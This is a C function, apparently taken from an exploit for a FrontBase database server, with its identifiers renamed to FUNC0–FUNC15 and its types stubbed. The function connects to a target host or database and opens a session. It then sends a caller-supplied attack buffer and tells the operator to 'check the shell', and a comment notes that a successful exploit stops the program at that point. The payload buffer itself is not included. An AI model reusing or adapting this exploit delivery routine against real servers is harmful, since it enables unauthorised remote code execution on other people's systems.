#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  FBCMetaData ;
typedef  int /*<<< orphan*/  FBCErrorMetaData ;
typedef  int /*<<< orphan*/  FBCDatabaseConnection ;

/* Variables and functions */
 int /*<<< orphan*/  FUNC0 () ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * FUNC2 (char*,char*,char*) ; 
 int /*<<< orphan*/ * FUNC3 (char*,int,char*) ; 
 int /*<<< orphan*/ * FUNC4 (int /*<<< orphan*/ *,char*,char*,char*,char*) ; 
 int /*<<< orphan*/ * FUNC5 (int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * FUNC6 (int /*<<< orphan*/ *,char*) ; 
 int /*<<< orphan*/  FUNC7 (int /*<<< orphan*/ *) ; 
 char* FUNC8 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC9 (int /*<<< orphan*/ *) ; 
 scalar_t__ FUNC10 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC11 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC12 (char*) ; 
 int /*<<< orphan*/  FUNC13 (char*,...) ; 
 int FUNC14 (char*) ; 

int FUNC15(char * host, int port, char * user, char * password, char * dbpassword, char * database, char * buf)
{
	FBCDatabaseConnection * fbdc;
	FBCMetaData *meta;
	char sesn[]="dreatica-fxp";   
	if(database!=NULL) port = -1;
	FUNC0();	
   	if (port!=-1)
	{
		FUNC13("[+] Connecting to %s:%d\n", host, port);
		fbdc = FUNC3(host, port, dbpassword); 
	}else
	{
		FUNC13("[+] Connecting to %s to database %s\n", host, database);
		fbdc = FUNC2(database, host, dbpassword);
	}
	if (fbdc == NULL)
	{
		FUNC13("[-] Cannot connect to %s\n", host);
		return -1;
	}	
	char * session_name=sesn;
	meta = FUNC4(fbdc, session_name, user, password, "system_user");
	if (FUNC10(meta) != 0)
	{
		FUNC13("[-] Failed to create session\n");
		FBCErrorMetaData* emd = FUNC5(fbdc, meta);
		char* msgs = FUNC8(emd);		
		FUNC9(emd);
		FUNC12(msgs);
		FUNC11(meta);
		FUNC1(fbdc);
		FUNC7(fbdc);
		return -1;
	}   
	FUNC11(meta);
	FUNC13("[+] Sending %d bytes of buffer to server, check the shell\n", FUNC14(buf));
		// if exploit success, the app will stop here.
	meta = FUNC6(fbdc, buf);
	if (FUNC10(meta) != 0)
	{
		FUNC13("[-] Failed to send buffer\n");
		FBCErrorMetaData* emd = FUNC5(fbdc, meta);
		char* msgs = FUNC8(emd);		
		FUNC9(emd);
		FUNC12(msgs);
		FUNC11(meta);
		FUNC1(fbdc);
		FUNC7(fbdc);
		return -1;
	}
	FUNC11(meta);
	return 1;
}